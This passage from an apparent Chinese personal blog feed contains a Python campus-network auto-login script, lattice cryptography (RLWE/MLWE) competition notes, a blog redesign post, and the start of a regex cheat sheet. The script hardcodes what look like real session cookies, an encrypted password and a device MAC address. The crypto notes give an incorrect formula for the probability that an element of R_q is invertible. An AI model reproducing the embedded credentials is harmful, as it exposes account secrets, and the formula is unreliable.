<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> targets:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> urllib.request.urlopen(url, timeout=timeout) <span class="keyword">as</span> response:</span><br><span class="line">                <span class="keyword">if</span> response.status == <span class="number">204</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auto_login</span>(<span class="params">post_URL, get_URL, log_file_path</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;自动联网脚本开始运行...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 请求校园网url</span></span><br><span class="line">        response = request.urlopen(get_URL)</span><br><span class="line">        html = response.read()</span><br><span class="line">        <span class="comment"># 获取title元素内容</span></span><br><span class="line">        res = re.findall(<span class="string">&#x27;&lt;title&gt;(.*)&lt;/title&gt;&#x27;</span>, html.decode(encoding=<span class="string">&quot;GBK&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;res:&#x27;</span>, res)</span><br><span class="line">        title = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;访问&quot;</span>,get_URL,<span class="string">&quot;失败，请检查请求地址！&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            title = res[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;title:&quot;</span>,title)</span><br><span class="line">        <span class="comment"># 根据title元素内容判断是否处于已登录状态</span></span><br><span class="line">        <span class="keyword">if</span> title == <span class="string">&#x27;登录成功&#x27;</span>:    </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;当前状态为：已登陆成功！&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;当前状态为：未登录！&#x27;</span>)</span><br><span class="line">            <span class="comment"># 设置post的请求头，浏览器点击F12，在Netword中选中post请求，点击Headers、request header面板中查看</span></span><br><span class="line">            header = &#123;</span><br><span class="line">                <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;781&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;EPORTAL_COOKIE_DOMAIN=false; EPORTAL_COOKIE_SAVEPASSWORD=true; EPORTAL_COOKIE_OPERATORPWD=; EPORTAL_COOKIE_NEWV=true; EPORTAL_COOKIE_PASSWORD=0c8e03e937910c800890ec544b109fce824381097eba5b4e91011f2c3615a959563377abf814d21320f9f0c98a6615cf42b17d3920473acdb51447afc135c59e2e8a69b4136afde0b623a64e56fc0a82f330f70ce253235e999cc858bff65867a22053c8186fd148a20e0ba3d45ced58808990a864a4f39c72f368ddf0086582; EPORTAL_AUTO_LAND=; EPORTAL_COOKIE_SERVER=%E7%A7%BB%E5%8A%A8; EPORTAL_COOKIE_SERVER_NAME=%E7%A7%BB%E5%8A%A8; EPORTAL_USER_GROUP=Student; EPORTAL_COOKIE_USERNAME=; JSESSIONID=BD9937825302ECA25A22692E95D92CF1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;10.10.9.4&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://10.10.9.4&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://10.10.9.4/eportal/index.jsp?wlanuserip=10.201.220.90&amp;wlanacname=FSN-XX-Business&amp;ssid=&amp;nasip=10.10.9.1&amp;snmpagentip=&amp;mac=44fa66c84741&amp;t=wireless-v2-plain&amp;url=http://www.msftconnecttest.com/redirect&amp;apmac=&amp;nasid=FSN-XX-Business&amp;vid=3326&amp;port=472&amp;nasportid=AggregatePort%20175.33260000:3326-0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 Edg/131.0.0.0&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 设置post的请求数据，浏览器点击F12，在Netword中选中post请求，点击payload面板中查看</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;userId&quot;</span>: <span class="string">&#x27;XXXX&#x27;</span>,  <span class="comment"># 需要根据自己的情况修改</span></span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;0c937910c800890ec544b109fce824381097eba5b4e91011f2c3615a9595abf814d21320f9f0c98a642b17d3920473acdb51447afc135c59e2e9b413e0b623a64e56fc0a82f330f70ce253235e999cc85a22053c8186fd148a20e0ba3d45ced58808990a864a4f39c72f3f0086582&#x27;</span>,  <span class="comment"># 需要根据自己的情况修改</span></span><br><span class="line">                <span class="string">&quot;queryString&quot;</span>: <span class="string">&#x27;wlanuserip%3D10.201.220.90%26wlanacname%3DFSN-XX-Business%26ssid%3D%26nasip%3D10.10.9.1%26snmpagentip%3D%26mac%3D44fa66c84741%26t%3Dwireless-v2-plain%26url%3Dhttp%3A%2F%2Fwww.msftconnecttest.com%2Fredirect%26apmac%3D%26nasid%3DFSN-XX-Business%26vid%3D3326%26port%3D472%26nasportid%3DAggregatePort%2520175.33260000%3A3326-0&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;passwordEncrypt&quot;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;operatorPwd&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;operatorUserId&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;validcode&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;service&quot;</span>: <span class="string">&#x27;%E7%A7%BB%E5%8A%A8&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 发送post请求（设置好header和data）</span></span><br><span class="line">            post_response = requests.post(post_URL, data, headers=header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;post请求状态码 <span class="subst">&#123;post_response.status_code&#125;</span>&quot;</span>)  <span class="comment"># 修正状态码获取方式</span></span><br><span class="line">            uft_str = post_response.text.encode(<span class="string">&quot;iso-8859-1&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">            <span class="comment"># 发送get请求（修改响应变量名）</span></span><br><span class="line">            schoolWebLoginURL = get_URL</span><br><span class="line">            get_status = requests.get(schoolWebLoginURL).status_code</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;get请求状态码 <span class="subst">&#123;get_status&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        error_msg = <span class="built_in">str</span>(e)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file_path, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> log_file:</span><br><span class="line">        log_file.write(<span class="string">f&quot;[<span class="subst">&#123;time.ctime()&#125;</span>] 自动联网脚本开始运行\n&quot;</span>)</span><br><span class="line">        log_file.write(<span class="string">f&quot;当前状态: <span class="subst">&#123;<span class="string">&#x27;已登陆成功&#x27;</span> <span class="keyword">if</span> title == <span class="string">&#x27;登录成功&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;未登录&#x27;</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;post_response&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            log_file.write(<span class="string">f&quot;POST状态码: <span class="subst">&#123;post_response.status_code&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;get_status&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            log_file.write(<span class="string">f&quot;GET状态码: <span class="subst">&#123;get_status&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error_msg&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            log_file.write(<span class="string">f&quot;错误信息: <span class="subst">&#123;error_msg&#125;</span>\n&quot;</span>)</span><br><span class="line">        log_file.write(<span class="string">&quot;-&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件大小，如果大于1KB则清空文件</span></span><br><span class="line">    <span class="keyword">if</span> os.path.getsize(log_file_path) &gt; <span class="number">1024</span>:</span><br><span class="line">        <span class="built_in">open</span>(log_file_path, <span class="string">&#x27;w&#x27;</span>).close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    log_file_path = <span class="string">&#x27;auto_connect.log&#x27;</span></span><br><span class="line">    <span class="comment"># 确保日志文件存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(log_file_path):</span><br><span class="line">        <span class="built_in">open</span>(log_file_path, <span class="string">&#x27;w&#x27;</span>).close()</span><br><span class="line">    </span><br><span class="line">    post_URL = <span class="string">&#x27;http://10.10.9.4/eportal/InterFace.do?method=login&#x27;</span> </span><br><span class="line">    get_URL = <span class="string">&#x27;http://10.10.9.4/eportal/success.jsp?userIndex=30313761383634643038313231376666613631393530663863623836663665345f31302e3230312e3232302e39305f3230323430333930313432&amp;keepaliveInterval=0&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> check_network_connection():</span><br><span class="line">            auto_login(post_URL, get_URL, log_file_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;网络已恢复，自动联网脚本结束运行&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 每1min左右检测一次是否成功连接</span></span><br><span class="line">        rand = random.uniform(<span class="number">0</span>, <span class="number">20</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;休眠&quot;</span>,<span class="built_in">int</span>(<span class="number">60.0</span> + rand),<span class="string">&quot;s&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">60.0</span> + rand)</span><br></pre></td></tr></table></figure><blockquote><p> 注意：本脚本只是用于自动做校园网账户的认证（在已经连着校园网的情况下才能验证），并不是让windows去自动连接某个校园网wifi。所以在平时使用时建议把校园网wifi的“自动连接”打开。或者尝试自己设计自动连接校园网wifi的脚本。（博主尝试过，但自动连接wifi时总会在桌面弹出校园网的浏览器登录网页，博主嫌功能一般、累赘就没添加）</p></blockquote><p>脚本需要安装依赖的模块和库，出现警告时检查是否缺少依赖模块。</p><h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><blockquote><p>提供两种方式，一种是将编写好的Python源码编译成可执行文件exe，另一种是使用bat批处理文件来执行Python脚本（这种便于开发调试，实时修改）。</p></blockquote><h3 id="编译成可执行文件exe"><a href="#编译成可执行文件exe" class="headerlink" title="编译成可执行文件exe"></a>编译成可执行文件exe</h3><ol><li><p>安装pyinstaller模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure></li><li><p>编译成可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F AutoConnect.py</span><br></pre></td></tr></table></figure><p>编译好的exe文件在dist目录下</p></li><li><p>win+r，输入shell:startup</p></li><li><p>把.exe拖入开机自启动文件夹里面</p></li></ol><h3 id="bat批处理脚本"><a href="#bat批处理脚本" class="headerlink" title="bat批处理脚本"></a>bat批处理脚本</h3><ol><li>编写bat批处理文件<br>新建一个bat文件，内容如下：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">python <span class="string">&quot;这里填写你的Python脚本路径&quot;</span></span><br><span class="line">pause</span><br></pre></td></tr></table></figure></li><li>win+r，输入shell:startup</li><li>把.bat拖入开机自启动文件夹里面</li></ol><h2 id="最终成品效果"><a href="#最终成品效果" class="headerlink" title="最终成品效果"></a>最终成品效果</h2><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_7.png" alt="示例图片" style="zoom:50%;" /></p><blockquote><p>脚本已推送到github：<a href="https://github.com/Aurorp1g/Auto_Connect">Auto_Connect</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
            <tag> Study </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码数学竞赛笔记</title>
      <link href="/posts/4d73e682.html"/>
      <url>/posts/4d73e682.html</url>
      
        <content type="html"><![CDATA[<h1 id="密码数学竞赛笔记"><a href="#密码数学竞赛笔记" class="headerlink" title="密码数学竞赛笔记"></a>密码数学竞赛笔记</h1><blockquote><p>密码数学赛题2：<a href="http://www.cmsecc.com/xiazai/">前往下载</a></p></blockquote><h2 id="一-题目解析"><a href="#一-题目解析" class="headerlink" title="一. 题目解析"></a>一. 题目解析</h2><p>文档涉及的数学概念解释如下：</p><h3 id="1-整数模-m-剩余类环-mathbb-Z-m"><a href="#1-整数模-m-剩余类环-mathbb-Z-m" class="headerlink" title="1. 整数模 $ m $ 剩余类环 $\mathbb{Z}_m$"></a>1. <strong>整数模 $ m $ 剩余类环 $\mathbb{Z}_m$</strong></h3><ul><li><strong>定义</strong>：由整数模 $ m $ 的剩余类构成，即 $ \mathbb{Z}_m = {0, 1, \dots, m-1} $。  </li><li><strong>运算</strong>：加法和乘法均在模 $ m $ 下进行。例如，在 $ \mathbb{Z}_5 $ 中，$ 3 + 4 = 2 $（因为 $ 7 \mod 5 = 2 $）。  </li><li><strong>用途</strong>：密码学中常用于限制数值范围，确保计算在有限域内进行。</li></ul><h3 id="2-多项式环-mathbb-Z-m-X"><a href="#2-多项式环-mathbb-Z-m-X" class="headerlink" title="2. 多项式环 $ \mathbb{Z}_m[X] $"></a>2. <strong>多项式环 $ \mathbb{Z}_m[X] $</strong></h3><ul><li><strong>定义</strong>：系数属于 $ \mathbb{Z}<em>m $ 的多项式集合，例如 $ a(X) = a_0 + a_1X + \cdots + a</em>{n-1}X^{n-1} $，其中 $ a_i \in \mathbb{Z}_m $。  </li><li><strong>运算</strong>：多项式加法和乘法，系数运算遵循模 $ m $ 规则。</li></ul><h3 id="3-商环-R-m-f-mathbb-Z-m-X-f-X"><a href="#3-商环-R-m-f-mathbb-Z-m-X-f-X" class="headerlink" title="3. 商环 $ R_{m,f} = \mathbb{Z}_m[X]/(f(X)) $"></a>3. <strong>商环 $ R_{m,f} = \mathbb{Z}_m[X]/(f(X)) $</strong></h3><ul><li><strong>生成方式</strong>：取 $ \mathbb{Z}_m[X] $ 模去一个首一多项式 $ f(X) $ 生成的主理想 $ (f(X)) $。  </li><li><strong>元素表示</strong>：每个剩余类是次数小于 $ n $ 的多项式，例如 $ R<em>{m,f} $ 中的元素可表示为 $ a_0 + a_1X + \cdots + a</em>{n-1}X^{n-1} $。  </li><li><strong>同构映射 $ \Phi $</strong>：将多项式映射到其系数向量 $ (a<em>0, a_1, \dots, a</em>{n-1}) $，保持加法结构（Abel 群同构）。</li></ul><h3 id="4-2-范数与-∞-范数"><a href="#4-2-范数与-∞-范数" class="headerlink" title="4. 2-范数与 ∞-范数"></a>4. <strong>2-范数与 ∞-范数</strong></h3><ul><li><strong>定义</strong>：  <ul><li><strong>2-范数</strong>：对 $ a \in \mathbb{Z}_m^n $，找到整数向量 $ b $ 满足 $ \Pi(b) = a $，取 $ |b|_2 = \sqrt{\sum b_i^2} $ 的最小值。  </li><li><strong>∞-范数</strong>：类似地，取 $ |b|_\infty = \max |b_i| $ 的最小值。  </li></ul></li><li><strong>短多项式</strong>：范数较小的多项式，对应格密码中的“小错误”或“小密钥”，是安全性的核心。</li></ul><h3 id="5-RLWE问题"><a href="#5-RLWE问题" class="headerlink" title="5. RLWE问题"></a>5. <strong>RLWE问题</strong></h3><ul><li><strong>问题描述</strong>：给定环 $ R_{m,f} $、随机多项式 $ a(X) $ 和目标 $ t(X) $，求解 $ s(X) \in C $ 和短错误 $ e(X) $，使得：<br>[ t(X) = a(X) \cdot s(X) + e(X) \mod (f(X), m). ]  </li><li><strong>条件子集 $ C $</strong>：限制 $ s(X) $ 的范数或汉明权重（如 $ |s(X)|_2 &lt; 10 $ 或 $ wt(s(X)) \leq 3 $），增加问题难度。</li></ul><h3 id="6-MLWE问题"><a href="#6-MLWE问题" class="headerlink" title="6. MLWE问题"></a>6. <strong>MLWE问题</strong></h3><ul><li><strong>推广形式</strong>：使用矩阵和向量推广 RLWE。给定矩阵 $ A(X) \in R_{m,f}^{k \times l} $ 和目标向量 $ t(X) $，求解私密向量 $ s(X) \in C $ 和错误向量 $ e(X) $，使得：<br>[ t(X)^T = A(X) \cdot s(X)^T + e(X)^T \mod (f(X), m). ]  </li><li><strong>参数 $ (k, l) $</strong>：例如 Kyber 中 $ (k,l) = (2,2) $，不同安全级别对应不同维度。</li></ul><h3 id="7-NIST-后量子密码标准"><a href="#7-NIST-后量子密码标准" class="headerlink" title="7. NIST 后量子密码标准"></a>7. <strong>NIST 后量子密码标准</strong></h3><ul><li><strong>Kyber</strong>：基于 MLWE，参数为 $ q = 3329 $、$ n = 256 $、$ f(X) = X^{256} + 1 $。  </li><li><strong>Dilithium</strong>：基于 MLWE，模数更大（$ q = 8380417 $），适用于数字签名。  </li><li><strong>中心二项分布</strong>：生成短多项式（私钥和错误项），保证问题困难性。</li></ul><h3 id="8-主理想-a-X-R-q-的概率"><a href="#8-主理想-a-X-R-q-的概率" class="headerlink" title="8. 主理想 $ (a(X)) = R_q $ 的概率"></a>8. <strong>主理想 $ (a(X)) = R_q $ 的概率</strong></h3><ul><li><strong>条件</strong>：当且仅当 $ a(X) $ 在 $ R_q $ 中可逆。  </li><li><strong>计算</strong>：概率 $ p $ 取决于 $ R_q $ 中可逆元素的比例。对于 $ R_q = \mathbb{Z}_q[X]/(X^n + 1) $，若 $ q $ 为素数且 $ X^n + 1 $ 在 $ \mathbb{Z}_q $ 上可分解为不同不可约因子，则概率为 $ \phi(q^n)/q^n $，其中 $ \phi $ 为欧拉函数。</li></ul><h3 id="9-格密码与安全性"><a href="#9-格密码与安全性" class="headerlink" title="9. 格密码与安全性"></a>9. <strong>格密码与安全性</strong></h3><ul><li><strong>困难假设</strong>：RLWE/MLWE 的困难性基于格中最短向量问题（SVP）的难解性。  </li><li><strong>实际应用</strong>：短错误和私钥使得攻击者难以从 $ t(X) $ 中分离出 $ s(X) $ 和 $ e(X) $，保障后量子密码方案（如 Kyber、Dilithium）的安全性。</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>考题结合了抽象代数（环、理想、范数）与密码学（LWE 问题变种、后量子密码设计），核心是通过短多项式在环结构中的运算困难性构建安全方案。参赛者需深入理解这些概念，并设计算法求解特定条件下的 RLWE/MLWE 实例。</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客大更新</title>
      <link href="/posts/45a2885f.html"/>
      <url>/posts/45a2885f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>博客网站初上线时间：2025-03-01<br>博客网站大更新时间：2025-05-16</p></blockquote><h1 id="博客大更新"><a href="#博客大更新" class="headerlink" title="博客大更新"></a>博客大更新</h1><p>在数字世界的浪潮中，我的博客也迎来了它的蜕变之旅。它不仅仅是代码的重构，更是我对分享和交流的全新探索。</p><h2 id="一、更新的初衷"><a href="#一、更新的初衷" class="headerlink" title="一、更新的初衷"></a>一、更新的初衷</h2><p>原先的博客存在着许多问题，例如：</p><ul><li>博客主题单调，只有色彩主题。</li><li>博文的内容显示不够美观。</li><li>阅读体验不佳。</li></ul><h2 id="二、更新的内容"><a href="#二、更新的内容" class="headerlink" title="二、更新的内容"></a>二、更新的内容</h2><p>原先的博客使用了hexo的aurora主题，主题的色彩单调，而且博文的内容显示不够美观。</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/45a2885f_1.png" alt="原先的博客页面"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/45a2885f_2.png" alt="原先的博客博文"></p><p>现在的博客使用了hexo的butterfly主题，主题的色彩更加丰富的，并且博文内容显示更加美观。同时仿照了其他博主的设计，结合自己的喜好，进行了修改。</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/45a2885f_3.png" alt="现在的博客页面"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/45a2885f_4.png" alt="现在的博客界面"></p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/45a2885f_5.png" alt="现在的博客博文"></p><h2 id="三、更新的收获"><a href="#三、更新的收获" class="headerlink" title="三、更新的收获"></a>三、更新的收获</h2><p>通过这次的更新，我对博客的主题进行了修改，使得博客的内容更加美观，同时也提高了前端开发的能力。</p>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式总结</title>
      <link href="/posts/d48b5b38.html"/>
      <url>/posts/d48b5b38.html</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式总结"><a href="#正则表达式总结" class="headerlink" title="正则表达式总结"></a>正则表达式总结</h1><h2 id="一、正则表达式简介"><a href="#一、正则表达式简介" class="headerlink" title="一、正则表达式简介"></a>一、正则表达式简介</h2><p>正则表达式（Regular Expression）是一种用于匹配字符串中字符组合的模式，广泛应用于文本处理、数据验证、搜索替换等领域。通过特定的字符和符号组合来定义匹配规则，能够高效地对字符串进行复杂的匹配和操作。</p><p>正则表达式引擎会从左到右扫描目标字符串，试图找到与正则表达式模式匹配的文本片段。当找到匹配时，会返回匹配的文本内容或根据指定的操作（如替换）进行处理。</p><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><h3 id="（一）字符匹配"><a href="#（一）字符匹配" class="headerlink" title="（一）字符匹配"></a>（一）字符匹配</h3><div class="table-container"><table><thead><tr><th style="text-align:left">表达式</th><th style="text-align:left">描述</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>.</code></td><td style="text-align:left">匹配任意单个字符（除换行符<code>\n</code>外）</td><td style="text-align:left"><code>a.b</code> 可以匹配 <code>a1b</code>、<code>a2b</code>、<code>a b</code> 等</td></tr><tr><td style="text-align:left"><code>[abc]</code></td><td style="text-align:left">匹配方括号内的任意一个字符</td><td style="text-align:left"><code>[abc]</code> 可以匹配 <code>a</code>、<code>b</code> 或 <code>c</code></td></tr><tr><td style="text-align:left"><code>[a-z]</code></td><td style="text-align:left">匹配指定范围内的任意一个字符</td><td style="text-align:left"><code>[a-z]</code> 可以匹配任意一个小写字母</td></tr><tr><td style="text-align:left"><code>[^abc]</code></td><td style="text-align:left">匹配不在方括号内的任意一个字符</td><td style="text-align:left"><code>[^abc]</code> 可以匹配除 <code>a</code>、<code>b</code>、<code>c</code> 之外的任意字符</td></tr><tr><td style="text-align:left"><code>\d</code></td><td style="text-align:left">匹配任意数字，等价于 <code>[0-9]</code></td><td style="text-align:left"><code>\d</code> 可以匹配 <code>0</code>、<code>1</code>、<code>9</code> 等</td></tr><tr><td style="text-align:left"><code>\w</code></td><td style="text-align:left">匹配任意字母或数字或下划线，等价于 <code>[A-Za-z0-9_]</code></td><td style="text-align:left"><code>\w</code> 可以匹配 <code>a</code>、<code>B</code>、<code>7</code>、<code>_</code></td></tr><tr><td style="text-align:left"><code>\s</code></td><td style="text-align:left">匹配任意空白字符，包括空格、制表符、换页符等</td><td style="text-align:left"><code>\s</code> 可以匹配空格、<code>\t</code>、<code>\f</code> 等</td></tr><tr><td style="text-align:left"><code>\D</code></td><td style="text-align:left">匹配任意非数字，等价于 <code>[^0-9]</code></td><td style="text-align:left"><code>\D</code> 可以匹配 <code>a</code>、<code>@</code>、<code>#</code> 等</td></tr><tr><td style="text-align:left"><code>\W</code></td><td style="text-align:left">匹配任意非字母数字下划线，等价于 <code>[^A-Za-z0-9_]</code></td><td style="text-align:left"><code>\W</code> 可以匹配 <code>@</code>、<code>#</code>、<code>%</code> 等</td></tr><tr><td style="text-align:left"><code>\S</code></td><td style="text-align:left">匹配任意非空白字符</td><td style="text-align:left"><code>\S</code> 可以匹配 <code>a</code>、<code>7</code>、<code>@</code> 等</td></tr></tbody></table></div><h3 id="（二）数量匹配"><a href="#（二）数量匹配" class="headerlink" title="（二）数量匹配"></a>（二）数量匹配</h3><div class="table-container"><table><thead><tr><th style="text-align:left">表达式</th><th style="text-align:left">描述</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>*</code></td><td style="text-align:left">匹配前面的字符或子模式零次或多次</td><td style="text-align:left"><code>a*</code> 可以匹配 <code>&quot;&quot;</code>（空字符串）、<code>a</code>、<code>aa</code> 等</td></tr><tr><td style="text-align:left"><code>+</code></td><td style="text-align:left">匹配前面的字符或子模式一次或多次</td><td style="text-align:left"><code>a+</code> 可以匹配 <code>a</code>、<code>aa</code> 等，但不能匹配空字符串</td></tr><tr><td style="text-align:left"><code>?</code></td><td style="text-align:left">匹配前面的字符或子模式零次或一次</td><td style="text-align:left"><code>a?</code> 可以匹配 <code>&quot;&quot;</code>（空字符串）或 <code>a</code></td></tr><tr><td style="text-align:left"><code>&#123;n&#125;</code></td><td style="text-align:left">匹配前面的字符或子模式恰好 <code>n</code> 次</td><td style="text-align:left"><code>a&#123;3&#125;</code> 可以匹配 <code>aaa</code></td></tr><tr><td style="text-align:left"><code>&#123;n,&#125;</code></td><td style="text-align:left">匹配前面的字符或子模式至少 <code>n</code> 次</td><td style="text-align:left"><code>a&#123;2,&#125;</code> 可以匹配 <code>aa</code>、<code>aaa</code> 等</td></tr><tr><td style="text-align:left"><code>&#123;n,m&#125;</code></td><td style="text-align:left">匹配前面的字符或子模式至少 <code>n</code> 次，最多 <code>m</code> 次</td><td style="text-align:left"><code>a&#123;1,3&#125;</code> 可以匹配 <code>a</code>、<code>aa</code>、<code>aaa</code></td></tr><tr><td style="text-align:left"><code>*?</code></td><td style="text-align:left">非贪心匹配，匹配前面的字符或子模式零次或多次，尽可能少地匹配</td><td style="text-align:left"><code>.*?</code> 匹配尽可能少的任意字符</td></tr><tr><td style="text-align:left"><code>+?</code></td><td style="text-align:left">非贪心匹配，匹配前面的字符或子模式一次或多次，尽可能少地匹配</td><td style="text-align:left"><code>.+?</code> 匹配尽可能少的一个或多个字符</td></tr><tr><td style="text-align:left"><code>??</code></td><td style="text-align:left">非贪心匹配，匹配前面的字符或子模式零次或一次，尽可能少地匹配</td><td style="text-align:left"><code>a??</code> 匹配尽可能少的零个或一个 <code>a</code></td></tr><tr><td style="text-align:left"><code>&#123;n&#125;?</code></td><td style="text-align:left">非贪心匹配，匹配前面的字符或子模式恰好 <code>n</code> 次</td><td style="text-align:left"><code>a&#123;3&#125;?</code> 匹配 <code>aaa</code>，但会尝试更短的匹配</td></tr><tr><td style="text-align:left"><code>&#123;n,&#125;?</code></td><td style="text-align:left">非贪心匹配，匹配前面的字符或子模式至少 <code>n</code> 次，尽可能少地匹配</td><td style="text-align:left"><code>a&#123;2,&#125;?</code> 匹配至少两个 <code>a</code>，但尽可能少</td></tr><tr><td 